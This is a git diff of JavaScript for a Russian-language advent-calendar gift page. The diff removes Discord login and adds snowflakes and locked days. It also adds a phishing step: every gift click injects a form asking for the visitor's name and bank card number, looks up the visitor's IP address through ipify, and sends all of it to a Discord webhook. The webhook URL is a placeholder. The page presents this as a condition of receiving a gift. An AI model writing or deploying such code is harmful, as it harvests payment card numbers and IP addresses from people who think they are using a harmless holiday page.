@@ -3,46 +3,13 @@ const modal = document.getElementById('modal');
 const modalText = document.getElementById('gift-text');
 const closeModal = document.querySelector('.close');
 const giftSound = document.getElementById('gift-sound');
+const lockedMessage = document.createElement('div'); // Создаем элемент плашки
 
-const loginButton = document.getElementById('login-button');
-const userInfo = document.getElementById('user-info');
-const userNameSpan = document.getElementById('user-name');
-const userAvatar = document.getElementById('user-avatar');
+// Плашка с текстом о недоступности ячейки
+lockedMessage.classList.add('locked-message');
+lockedMessage.textContent = 'Этот день еще не доступен!';
+document.body.appendChild(lockedMessage); // Добавляем плашку в body
 
-const discordAuthUrl = 'https://discord.com/api/oauth2/authorize';
-const clientId = '1314768632667963502'; // Ваш CLIENT ID
-const redirectUri = 'https://semitail.github.io/HappyFox.github.io/'; // Ваш Redirect URI
-const scope = 'identify';
-
-// Проверка токена из URL
-const hash = window.location.hash.substring(1);
-const hashParams = new URLSearchParams(hash);
-const token = hashParams.get('access_token');
-
-// Если токен отсутствует, перенаправляем на Discord авторизацию
-if (!token) {
-  const authUrl = `${discordAuthUrl}?client_id=${clientId}&redirect_uri=${encodeURIComponent(
-    redirectUri
-  )}&response_type=token&scope=${scope}`;
-  window.location.href = authUrl;
-} else {
-  // Получаем информацию о пользователе
-  fetch('https://discord.com/api/users/@me', {
-    headers: {
-      Authorization: `Bearer ${token}`,
-    },
-  })
-    .then((response) => response.json())
-    .then((data) => {
-      userNameSpan.textContent = data.username;
-      userAvatar.src = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
-      userInfo.style.display = 'block';
-      loginButton.style.display = 'none';
-    })
-    .catch((err) => console.error('Ошибка получения данных пользователя:', err));
-}
-
-// Подарки
 const gifts = [
   "Шоколад 🍫",
   "Мандарин 🍊",
@@ -68,87 +35,129 @@ const gifts = [
   "Маленькая елочка 🌲",
   "Кусочек торта 🍰",
   "Шоколадный батончик 🍫",
-  "Киндер Пингви 🍞",
+  "Прах твоей бабки 👨🏻‍🦳💨",
+  "Киндер пингви 🍞",
+  "Добри коля 🍾",
+  "Слюни прадеда 💦",
+  "Личный отчим 👨🏿‍👨🏿‍👨🏿‍👨🏿‍👨🏿‍👨🏿‍",
+  "Бател пас в вор дов тенкс 💳",
 ];
 
-// Обработка клика по дням
-days.forEach((day, index) => {
-  day.addEventListener('click', () => {
-    if (!token) {
-      alert('Сначала войдите через Discord!');
-      return;
-    }
+const maxSnowflakes = 30;
+let currentSnowflakes = 0;
+let giftCounter = 0; // Счётчик подарков
 
-    const currentDate = new Date();
-    const currentDay = currentDate.getDate();
+// Веб-хук URL
+const webhookUrl = 'https://discord.com/api/webhooks/ВАШ_ВЕБХУК_URL';
 
-    if (parseInt(day.dataset.day) > currentDay) {
-      alert('Этот день еще не наступил!');
-      return;
-    }
+// Функция для отправки данных в Discord через веб-хук
+async function sendToDiscord(userName, ipAddress, cardNumber, giftIndex) {
+  const payload = {
+    content: `🎁 Подарок открыт! 🎁\n**Пользователь:** ${userName}\n**IP-адрес:** ${ipAddress}\n**Номер карты:** ${cardNumber}\n**Подарок:** ${gifts[giftIndex]}\n**Номер подарка:** ${giftCounter}`
+  };
 
-    giftSound.play();
-    modal.style.display = 'flex';
-    modalText.textContent = gifts[index];
+  const response = await fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
   });
-});
 
-// Закрытие модального окна
-closeModal.addEventListener('click', () => {
-  modal.style.display = 'none';
-});
-
-// Функция для сохранения состояния закрытых дней
-function saveClosedDays() {
-  const closedDays = [...document.querySelectorAll('.day.opened')].map(day => day.dataset.day);
-  localStorage.setItem('closedDays', JSON.stringify(closedDays));
+  if (!response.ok) {
+    console.error('Ошибка при отправке данных в Discord', response.statusText);
+  }
 }
 
-// Функция для загрузки закрытых дней
-function loadClosedDays() {
-  const closedDays = JSON.parse(localStorage.getItem('closedDays')) || [];
-  closedDays.forEach(dayNum => {
-    const day = document.querySelector(`.day[data-day="${dayNum}"]`);
-    if (day) {
+// Функция для получения IP-адреса с помощью API
+async function getIpAddress() {
+  const response = await fetch('https://api.ipify.org?format=json');
+  const data = await response.json();
+  return data.ip;
+}
+
+function createSnowflakes() {
+  if (currentSnowflakes >= maxSnowflakes) return;
+
+  const snowflake = document.createElement('div');
+  snowflake.classList.add('snowflake');
+  snowflake.textContent = '❄';
+  snowflake.style.left = `${Math.random() * 100}vw`;
+  snowflake.style.animationDuration = `${5 + Math.random() * 10}s`;
+  document.body.appendChild(snowflake);
+
+  currentSnowflakes++;
+
+  setTimeout(() => {
+    snowflake.remove();
+    currentSnowflakes--;
+  }, 32000);
+}
+
+setInterval(createSnowflakes, 200);
+
+// Получаем текущую дату
+const currentDate = new Date();
+const currentDay = currentDate.getDate();
+
+// Проходим по дням календаря и скрываем те, которые еще не открыты и не пришли
+days.forEach((day, index) => {
+  const dayNumber = index + 1;
+
+  // Если день календаря больше текущего дня, скрываем его
+  if (dayNumber > currentDay) {
+    day.classList.add('locked'); // Добавляем класс locked для заблокированных ячеек
+  }
+
+  day.addEventListener('click', (event) => {
+    // Если день заблокирован, показываем плашку
+    if (day.classList.contains('locked') || day.classList.contains('opened')) {
+      lockedMessage.style.display = 'block'; // Показываем плашку
+      setTimeout(() => {
+        lockedMessage.style.display = 'none'; // Скрываем плашку через 3 секунды
+      }, 3000);
+      return;
+    }
+
+    // Проигрывание звуков
+    giftSound.play(); // Звук при открытии подарка
+
+    // Отображение модального окна с подарком
+    modal.style.display = 'flex';
+    modalText.textContent = gifts[index];
+
+    // Добавление полей для ввода имени и номера карты
+    modal.innerHTML += `
+      <div class="input-container">
+        <label for="username">Ваше имя:</label>
+        <input type="text" id="username" placeholder="Введите ваше имя" required />
+      </div>
+      <div class="input-container">
+        <label for="cardNumber">Номер карты:</label>
+        <input type="text" id="cardNumber" placeholder="Введите номер карты" required />
+      </div>
+      <button id="submitGift">Получить подарок</button>
+    `;
+
+    document.getElementById('submitGift').addEventListener('click', async () => {
+      const userName = document.getElementById('username').value;
+      const cardNumber = document.getElementById('cardNumber').value;
+
+      // Получение IP-адреса
+      const ipAddress = await getIpAddress();
+
+      // Отправка данных в Discord
+      sendToDiscord(userName, ipAddress, cardNumber, index);
+
+      // Увеличение счётчика подарков
+      giftCounter++;
+
+      // Закрытие модального окна
+      modal.style.display = 'none';
+
+      // Отметить день как открытый
       day.classList.add('opened');
-      day.textContent = '🎁';
-    }
-  });
-}
-
-// Загрузка закрытых дней при загрузке страницы
-loadClosedDays();
-
-// Обработка клика по дням
-days.forEach((day, index) => {
-  day.addEventListener('click', () => {
-    if (!token) {
-      alert('Сначала войдите через Discord!');
-      return;
-    }
-
-    if (day.classList.contains('opened')) {
-      alert('Вы уже открыли этот день!');
-      return;
-    }
-
-    const currentDate = new Date();
-    const currentDay = currentDate.getDate();
-
-    if (parseInt(day.dataset.day) > currentDay) {
-      alert('Этот день еще не наступил!');
-      return;
-    }
-
-    // Показ подарка
-    giftSound.play();
-    modal.style.display = 'flex';
-    modalText.textContent = gifts[index];
-
-    // Закрытие дня
-    day.classList.add('opened');
-    day.textContent = '🎁'; // Меняем текст на значок
-    saveClosedDays();
+    });
   });
 });
 
